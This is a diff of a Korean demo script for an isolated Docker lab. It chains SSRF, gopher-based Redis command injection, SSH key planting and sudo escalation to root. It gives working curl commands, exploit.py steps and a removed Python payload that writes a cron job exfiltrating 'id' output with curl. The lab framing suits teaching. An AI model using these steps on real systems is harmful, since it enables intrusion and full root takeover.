@@ -1,21 +1,25 @@
-# 시연 가이드 (SSRF → Redis(root) → Cron RCE)
+# 시연 가이드 (사전 정찰 → Via 헤더 → SSRF → Redis 계정 열거/키 주입 → SSH → sudo 권한상승)
 
 이 문서는 `README.md`의 기술 문서를 바탕으로, 실제로 화면 앞에서 시연할 때 순서대로 따라 할 수 있도록
 정리한 실습 스크립트입니다. 쇼핑몰(`ec-site`) 화면은 **일본어 UI + 엔화(¥) 표시**로 되어 있습니다.
 
-> ⚠️ 반드시 격리된 로컬 Docker 환경에서만 실행하세요. 이 문서에 나오는 모든 명령/페이로드는
-> `lab-rb` 프로젝트가 만든 자체 컨테이너(`localhost:8080`, 내부망 `proxy-server.internal`)만을
-> 대상으로 합니다.
+> ⚠️ 반드시 격리된 로컬 Docker 환경에서만 실행하세요. `internal-net`(Redis/Squid)은 host에서 직접
+> 도달할 수 없습니다. ec-site(80)와 proxy-server의 SSH(22)만 host에 발행되어 있어, 공격자 관점
+> 명령 대부분은 host 터미널에서 바로 실행할 수 있습니다. `attacker` 컨테이너는 네트워크 세그멘테이션
+> 자체를 보여줄 때(1단계 참고) 선택적으로 사용합니다.
+>
+> host의 22번을 그대로 매핑했으므로, macOS "원격 로그인"이 켜져 있으면 포트가 충돌합니다. 랩을 쓰는
+> 동안은 꺼두세요.
 
 ## 0. 사전 준비
 
 ```bash
 cd lab-rb
 docker compose up --build -d   # 최초 빌드 + 백그라운드 기동
-docker compose ps              # ec-site, proxy-server 두 컨테이너 모두 Up 확인
+docker compose ps              # ec-site / proxy-server / attacker 모두 Up 확인
 ```
 
-브라우저에서 `http://localhost:8080` 접속 → 일본어 쇼핑몰 홈 화면(상품 그리드, ¥ 가격)이 보이면 준비 완료.
+브라우저에서 `http://localhost` 접속 → 일본어 쇼핑몰 홈 화면(상품 그리드, ¥ 가격)이 보이면 준비 완료.
 
 문제가 생기면 언제든 초기화:
 
@@ -25,11 +29,35 @@ docker compose down -v && docker compose up --build -d
 
 ---
 
-## 1단계 — 정상 사용자 흉내내기 (회원가입 → 로그인 → 장바구니)
+## 1단계 — 사전 정찰: 외부에서 SSH 포트를 먼저 발견해둔다
 
-공격 전에, 이 사이트가 "평범한 이커머스"로 보인다는 것부터 보여줍니다.
+공격자가 Redis부터 뚫는 게 아니라, **이미 대상 조직의 공인 IP를 스캔해서 22번(SSH)이 열려 있다는 걸
+알고 있었다**는 전제를 먼저 보여줍니다. 이 시점엔 어떤 서버인지, 어떤 계정이 있는지 전혀 모르고 키도
+없어서 그냥 기록만 해두고 넘어갑니다 — 뒤에서 다시 등장할 복선입니다.
 
-1. `http://localhost:8080` → 상단 네비게이션 **新規登録**(회원가입) 클릭 → 이메일/비밀번호 입력 후 가입.
+```bash
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 root@localhost
+```
+
+**결과**: `Permission denied (publickey).` — 포트는 도달하지만(소스 IP 제한이 없어 host에서도 그대로
+접근 가능) 계정도 키도 몰라 지금은 손댈 수 없습니다.
+
+mgmt-net 안에서는 Squid/Redis 포트가 아예 막혀 있다는 것도 attacker 컨테이너로 보여줄 수 있습니다
+(host에는 애초에 3128/6379가 발행되어 있지 않아 host에서는 이 차단 자체를 관찰할 수 없습니다):
+
+```bash
+docker compose exec attacker sh -c \
+  "curl -s -o /dev/null -w '%{http_code}\n' --max-time 4 http://proxy-server:3128/"   # 응답 없음(차단)
+```
+
+---
+
+## 2단계 — 정상 사용자 흉내내기 (회원가입 → 로그인 → 장바구니)
+
+이제 접근하기 쉬운 웹 앱(쇼핑몰)부터 공략합니다. 공격 전에, 이 사이트가 "평범한 이커머스"로 보인다는
+것부터 보여줍니다.
+
+1. `http://localhost` → 상단 네비게이션 **新規登録**(회원가입) 클릭 → 이메일/비밀번호 입력 후 가입.
 2. 자동으로 **ログイン**(로그인) 페이지로 이동 → 방금 만든 계정으로 로그인.
 3. 상품 하나 클릭 → 상세 페이지에서 **カートに入れる**(장바구니 담기) → 상단 **カート**(장바구니) 클릭.
 4. 수량 변경/삭제가 정상 동작하는 것을 보여준 뒤 **注文する**(주문하기) → 이름/주소 입력 →
@@ -40,190 +68,134 @@ docker compose down -v && docker compose up --build -d
 
 ---
 
-## 2단계 — 정찰 + SSRF: "상품 이미지 자동 로딩"에 숨어있는 취약점 (취약점 ①)
+## 3단계 — 정찰: 마이페이지 프로필 이미지 등록으로 내부 호스트명 알아내기
 
-여기서부터가 핵심입니다. **버튼을 누르는 명시적인 "미리보기" 기능이 아니라, 상품 이미지가
-페이지를 열기만 해도 자동으로 로드되는 과정 자체에 정찰 지점과 SSRF가 함께 숨어 있습니다.**
-
-### 2-1. 자동 호출 + Via 헤더 확인 (정찰)
-
-1. 로그인 후 홈(`/`) 또는 아무 상품 상세 페이지를 열고 개발자도구(F12) → Network 탭을 켭니다.
-2. 이미지 요청들을 보면 전부 다음과 같은 형태입니다:
+1. 로그인 상태에서 상단 **マイページ** 클릭.
+2. "プロフィール画像URLの登録" 폼에 아무 이미지 URL(예: `http://example.com/`, `https://example.com/`
+   둘 다 가능)을 입력하고 **登録** 클릭.
+3. 개발자도구(F12) → Network 탭에서 방금 보낸 `POST /profile/image-preview` 요청의 Response Headers를
+   확인하면 다음 헤더가 보입니다:
 
    ```
-   GET /product/image?url=http://ec-site/static/img/products/p1.svg
-   GET /product/image?url=http://ec-site/static/img/products/p2.svg
-   ...
+   Via: 1.1 proxy-server.internal (squid/x.x)
    ```
 
-   → 즉 브라우저가 이미지를 직접 받아오는 게 아니라, **매 페이지 로드마다 서버(`ec-site`)가 `url`
-   파라미터로 대신 이미지를 가져와서 응답**하고 있습니다. 이건 실제 서비스에서 흔히 쓰는 "이미지
-   썸네일/CDN 프록시" 패턴을 흉내 낸 것이며, 사용자는 이 사실을 전혀 알 수 없습니다.
-3. 방금 뜬 이미지 요청 중 하나를 클릭 → Response Headers 확인:
+   버튼 하나 눌러 "정상 기능"을 사용해본 것만으로 내부 프록시 호스트명(`proxy-server.internal`)이
+   드러났습니다. **이 이름 자체가 게이트웨이/배스천 성격을 암시합니다** — 1단계에서 봐뒀던 그 22번
+   포트와 같은 서버일 가능성을 의심하게 되는 지점입니다.
 
-   ```
-   Via: 1.1 proxy-server.internal (squid/6.9)
-   ```
-
-   → 이 요청은 사내 정책에 따라 Squid(`proxy-server.internal:3128`)를 거쳐 나가고, Squid가 표준
-   동작으로 붙이는 `Via` 헤더가 필터링 없이 그대로 전달됩니다. **버튼을 누른 적도 없이 페이지를 한 번
-   연 것만으로 공격자는 내부 호스트명 `proxy-server.internal`을 알아냅니다.**
-
-### 2-2. SSRF 확인 + 블라인드 포트 스캔
-
-`url` 파라미터를 그대로 브라우저 주소창에 복사해 다른 값으로 바꿔서 요청해봅니다. 개발자가 "프록시를
-거치니 안전하다"고 여겼겠지만, Squid ACL이 목적지를 전혀 제한하지 않아(취약점 ③) 내부망 어디든 자유롭게
-요청을 보낼 수 있습니다.
+CLI로도 동일하게 확인할 수 있습니다:
 
 ```bash
-# open (Redis, 6379) — 열려있지만 HTTP가 아님 → 빠르게 200
-curl -s -o /dev/null -w "%{http_code} (%{time_total}s)\n" \
-  "http://localhost:8080/product/image?url=http://proxy-server.internal:6379"
-
-# closed (sshd 미설치, 22) — 빠르게 502
-curl -s -o /dev/null -w "%{http_code} (%{time_total}s)\n" \
-  "http://localhost:8080/product/image?url=http://proxy-server.internal:22"
-
-# filtered (internal-net 대역 172.28.99.0/24 안의 존재하지 않는 IP) — 약 3초 후 504
-curl -s -o /dev/null -w "%{http_code} (%{time_total}s)\n" \
-  "http://localhost:8080/product/image?url=http://172.28.99.254:9999"
+curl -s -D - -c /tmp/c.txt -b /tmp/c.txt -X POST http://localhost/profile/image-preview \
+  -d "url=http://example.com/" -o /dev/null
 ```
-
-| 상태 | 응답 코드 | 응답 시간 | 판별 근거 |
-|---|---|---|---|
-| open (6379) | 200 | 매우 빠름 | Squid가 응답은 받았지만 HTTP가 아님(`X-Squid-Error: ERR_ZERO_SIZE_OBJECT`) |
-| closed (22) | 502 | 매우 빠름 | Squid의 TCP 연결 자체가 거부됨(`X-Squid-Error: ERR_CONNECT_FAIL`) |
-| filtered | 504 | 약 3초 | Squid의 연결 시도가 끝나기 전에 ec-site 쪽 3초 타임아웃이 먼저 만료 |
-
-> ⚠️ filtered 테스트용 IP는 반드시 `172.28.99.0/24`(internal-net 서브넷) **안의** 미사용 주소를
-> 써야 합니다. 서브넷 밖의 임의 IP(예: `10.255.255.1`)는 즉시 "no route" 오류로 실패해 3초 지연이
-> 재현되지 않습니다.
-
-이 세 가지 응답 패턴 차이만으로 공격자는 방화벽 뒤 내부망의 포트 상태를 원격에서 추측할 수 있습니다
-("블라인드" 포트 스캔). `gopher://` 스킴은 `requests`가 지원하지 않아 raw 소켓으로 직접 처리되는데,
-이 분기는 애초에 Squid를 거치지 않으므로 다음 단계의 Redis 명령 스머글링은 프록시와 무관하게 그대로
-가능합니다.
+(사전에 `/register`, `/login`으로 로그인 쿠키를 만들어 둬야 합니다.)
 
 ---
 
-## 3단계 — Redis 명령 스머글링 (gopher://) → cron에 RCE 페이로드 주입 (취약점 ②)
+## 4단계 — SSRF 블라인드 포트 스캔: 상품 이미지 자동 로딩 엔드포인트 악용
 
-6379 포트가 열려 있다는 것을 확인했으니, `gopher://` 스킴으로 Redis 프로토콜 명령을 직접 주입합니다.
-
-### 3-1. 페이로드 생성 스크립트
-
-```bash
-python3 - <<'EOF'
-import urllib.parse, urllib.request
-
-# 선행 \n 필수: Redis RDB 파일의 바이너리 헤더 안에 우연히 개행(0x0a)이 섞여 있어,
-# \n으로 한 번 끊어주지 않으면 cron 스케줄이 바이너리 쓰레기와 같은 줄에 붙어 파싱이 실패함.
-cron_line = "\n* * * * * curl -s -X POST -d \"$(id)\" http://ec-site/internal/collect\n"
-
-def resp_cmd(*args):
-    out = f"*{len(args)}\r\n"
-    for a in args:
-        out += f"${len(a)}\r\n{a}\r\n"
-    return out
-
-cmds = (
-    resp_cmd("CONFIG", "SET", "dir", "/etc/crontabs")
-    + resp_cmd("CONFIG", "SET", "dbfilename", "root")
-    + resp_cmd("SET", "payload", cron_line)
-    + resp_cmd("SAVE")
-)
-
-gopher_url = "gopher://proxy-server.internal:6379/_" + urllib.parse.quote(cmds)
-target = "http://localhost:8080/product/image?url=" + urllib.parse.quote(gopher_url, safe="")
-
-print("[*] 전송할 URL:")
-print(target)
-print()
-print("[*] 전송 중...")
-resp = urllib.request.urlopen(target, timeout=10)
-print("[*] 응답:", repr(resp.read().decode('latin-1')))
-EOF
-```
-
-**응답이 `'+OK\r\n+OK\r\n+OK\r\n+OK\r\n'` (성공 4개)이면 주입 성공입니다.**
-
-### 3-2. 파일 생성 확인 (선택, 시연용)
+`GET /product/image?url=...`는 페이지를 열 때마다 상품 이미지를 자동으로 로드하는 기능이지만, Squid를
+거치지 않고 목적지에 직접 연결하며 목적지 검증이 없습니다. 방금 알아낸 `proxy-server.internal`을
+대상으로 host에서 직접 확인합니다:
 
 ```bash
-docker exec lab-rb-proxy-server-1 ls -l /etc/crontabs/root
+# Redis(6379): 열려 있지만 HTTP가 아님 → 200 "port open, non-http response"
+curl -s "http://localhost/product/image?url=http://proxy-server.internal:6379/"
+
+# 닫힌 포트 → 502 "connection refused"
+curl -s "http://localhost/product/image?url=http://proxy-server.internal:9999/"
+
+# Squid(3128): 열려 있고 HTTP 응답 → 200
+curl -s -o /dev/null -w "%{http_code}\n" "http://localhost/product/image?url=http://proxy-server.internal:3128/"
 ```
 
-방금 시각으로 mtime이 갱신되고 소유자가 root인 것을 확인합니다 (attacker는 proxy-server 컨테이너에
-직접 접속한 적이 없다는 점을 강조하세요 — 이 `docker exec`는 시연자가 "증거"를 보여주기 위한 것일 뿐,
-공격 경로의 일부가 아닙니다).
+세 가지 응답이 명확히 구분되어 블라인드 포트 스캔이 가능함을 보여줍니다. Redis(6379)가 미인증으로
+열려 있다는 것을 확인했으니, 이제 1단계에서 봐뒀던 SSH 포트를 "채울" 방법이 생겼습니다.
 
 ---
 
-## 4단계 — RCE 콜백 확인 (root 권한 코드 실행 증명)
+## 5단계 — Redis로 계정 열거 + SSH 공개키 주입
 
-busybox crond가 파일 교체(Redis의 원자적 rename)를 감지해 최대 1분 내로 주입된 cron 항목을 실행합니다.
+Redis가 미인증이라는 것만으로는 아직 부족합니다 — **어떤 계정으로 SSH가 열려 있는지 모릅니다.**
+이 단계부터는 host에서 `exploit.py`로 자동화되어 있습니다 (repo 루트에서):
 
 ```bash
-# 60~90초 대기 후:
-curl -s "http://localhost:8080/internal/results?format=json" | python3 -m json.tool
+python3 exploit.py
 ```
 
-또는 브라우저로 `http://localhost:8080/internal/results` 접속.
+`exploit.py`가 하는 일:
 
-**성공 시 다음과 같은 결과가 매분 하나씩 쌓입니다:**
+1. **계정 열거**: `CONFIG SET dir /home/<후보>/.ssh`를 계정명 워드리스트(`ubuntu`, `admin`,
+   `deploy`, `proxyuser`, ... `exploit.py`의 `USERNAME_CANDIDATES`)에 대해 gopher로 반복 전송합니다.
+   Redis는 그 경로가 실제로 존재해야만 `+OK`를 반환하므로, 어떤 계정이 이 서버에 있는지 알아낼 수
+   있습니다(미인증 Redis를 "디렉토리 존재 여부 오라클"로 쓰는 기법).
+2. **키 생성**: host에 새 SSH 키쌍(`id_ed25519`, `id_ed25519.pub`, repo 루트에 생성)을 만듭니다.
+3. **키 주입**: 찾아낸 계정에 대해 gopher RESP 페이로드로 Redis 명령을 순서대로 전송합니다:
+   - `CONFIG SET dir /home/<찾은 계정>/.ssh`
+   - `CONFIG SET dbfilename authorized_keys`
+   - `SET payload "\n\n<attacker 공개키>\n\n"`
+   - `SAVE`
+4. ec-site의 `/product/image?url=gopher://proxy-server.internal:6379/_...`로 위 페이로드를 전송 —
+   attacker는 internal-net에 직접 도달할 수 없으므로 반드시 이 SSRF를 거쳐야 합니다.
+5. `+OK\r\n+OK\r\n+OK\r\n+OK\r\n` 응답이 오면 `/home/<찾은 계정>/.ssh/authorized_keys`에 공개키가
+   기록된 것입니다. (`.ssh` 디렉토리가 Redis 실행 계정과 그룹 쓰기 권한을 공유하도록 오설정되어
+   있기 때문에 가능합니다 — README 취약점 5 참고.)
 
-```json
-{
-  "id": 35,
-  "created_at": "2026-09-14 03:51:00",
-  "source_ip": "172.25.0.2",
-  "payload": "{\"uid\": \"0(root) gid=0(root) groups=0(root),...\"}"
-}
+수동으로 확인하려면 (계정명은 실행 로그에서 확인):
+
+```bash
+docker compose exec proxy-server cat -A /home/<찾은 계정>/.ssh/authorized_keys
 ```
-
-- `uid=0(root)`가 보이면 킬체인 완성입니다: **공격자는 proxy-server에 단 한 번도 직접 연결하지 않고,
-  SSRF(취약점 ①) → Redis 미인증 명령 주입(취약점 ②) → cron RCE까지 root 권한 코드 실행에
-  성공했습니다.** 결과는 ec-site의 무인증 콜백 엔드포인트(`/internal/collect`)로 전달되어 조회한
-  것입니다.
-- 1분마다 계속 콜백이 쌓이는 것도 정상입니다 (cron이 `* * * * *`로 계속 실행 중이라는 뜻).
-
-### 만약 60~90초가 지나도 결과가 안 뜨면
-
-- crond가 컨테이너 기동 직후 기본 크론탭을 이미 메모리에 로드한 상태에서 Redis가 파일을 rename으로
-  교체한 경우, 드물게 재파싱 타이밍을 놓칠 수 있습니다. 다음으로 강제 재기동해서 재확인하세요:
-
-  ```bash
-  docker exec lab-rb-proxy-server-1 sh -c 'kill -9 $(pgrep crond); sleep 1; crond'
-  ```
-
-  이후 다시 60~90초 대기 후 `/internal/results`를 확인합니다.
+RDB 바이너리 헤더/푸터 사이에 `ssh-ed25519 AAAA...` 형태의 유효한 키 줄이 보이면 성공입니다.
 
 ---
 
-## 5단계 — 정리 및 리셋
+## 6단계 — SSH 로그인 → sudo 권한상승 → root 셸
+
+`exploit.py`가 이어서 자동으로 수행하지만, 수동으로도 재현할 수 있습니다 (host에서, `<계정>`은
+5단계에서 찾은 이름으로 교체):
 
 ```bash
-docker compose down -v   # 컨테이너 + 볼륨 완전 삭제 (DB, 주입된 크론탭 등 모두 초기화)
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 -i id_ed25519 \
+  <계정>@localhost "id; sudo -l"
 ```
 
-다음 시연을 위해서는 `docker compose up --build -d`로 처음부터 다시 시작하면 됩니다.
+**결과**: 이번엔 1단계와 달리 로그인에 성공합니다 (`uid=...(<계정>) ...`) — 1단계에서 발견해뒀던 바로 그
+포트입니다. `sudo -l`은 다음을 보여줍니다:
+
+```
+User <계정> may run the following commands on proxy-server:
+    (ALL) NOPASSWD: /usr/bin/python3
+```
+
+root 셸 획득:
+
+```bash
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 -i id_ed25519 \
+  <계정>@localhost "sudo /usr/bin/python3 -c 'import os; os.system(\"id\")'"
+```
+
+`uid=0(root) gid=0(root) groups=0(root)`가 출력되면 킬체인 전체(사전 정찰 → Via 정찰 → SSRF →
+Redis 계정 열거/미인증 접근 → SSH 키 주입 → 배스천 소스 IP 미제한 → sudo 권한상승 → root)가
+완성된 것입니다.
 
 ---
 
-## 요약: 킬체인 한눈에 보기
+## 트러블슈팅
 
-```
-① 정찰 + SSRF            상품 이미지 "자동 로딩" 과정 자체가 Via 헤더로
-   (같은 지점에 공존)       내부 호스트명을 흘리는 동시에, 목적지 검증 없는
-                          서버발 임의 URL 요청 기능이었음 → 포트 스캔 가능
-        │
-        ▼
-② Redis 미인증 + root     SSRF로 확보한 유일한 경로로 gopher:// 스킴을 통해
-   실행 (RCE 삽입)         Redis 명령을 주입 → cron 파일을 임의로 덮어씀
-        │
-        ▼
-③ cron RCE 실행 + 콜백    busybox crond가 최대 1분 내 root 권한으로 명령 실행
-                          → 결과는 무인증 콜백 엔드포인트로 회수 (직접 연결 없이)
-```
-
-각 단계의 상세한 원리와 "올바른 운영 설정"은 `README.md`를 참고하세요.
+- **`ssh: connect to host localhost port 22: Connection refused`**: `docker compose ps`로
+  proxy-server가 Up 상태이고 PORTS 열에 `0.0.0.0:22->22/tcp`가 보이는지 확인하세요.
+- **`ssh: connect to host localhost port 22: Connection reset` 또는 macOS 자체 SSH와 충돌**:
+  시스템 설정 → 일반 → 공유 → "원격 로그인"이 켜져 있으면 host의 22번을 macOS 자체 sshd가 이미 쓰고
+  있는 것입니다. 꺼두고 `docker compose up -d`를 다시 실행하세요.
+- **`Authentication refused: bad ownership or modes for file ...`가 `docker compose logs
+  proxy-server`에 보임**: `sshd_config`의 `StrictModes no`가 이미지에 반영됐는지 확인
+  (`docker compose build proxy-server`로 재빌드).
+- **exploit.py가 `[-] no candidate account had a home directory`로 종료**: 계정명 워드리스트에
+  실제 계정이 없는 것입니다. `exploit.py`의 `USERNAME_CANDIDATES`에 후보를 추가하세요.
+- **exploit.py 재실행 시 `ssh-keygen` 오류**: `exploit.py`가 매 실행마다 기존 키를 자동으로 지우고
+  새로 만들도록 되어 있어 보통 발생하지 않지만, 남아있다면 repo 루트에서
+  `rm -f id_ed25519 id_ed25519.pub` 후 다시 실행하세요.
+- **완전 초기화**: `docker compose down -v && docker compose up --build -d`
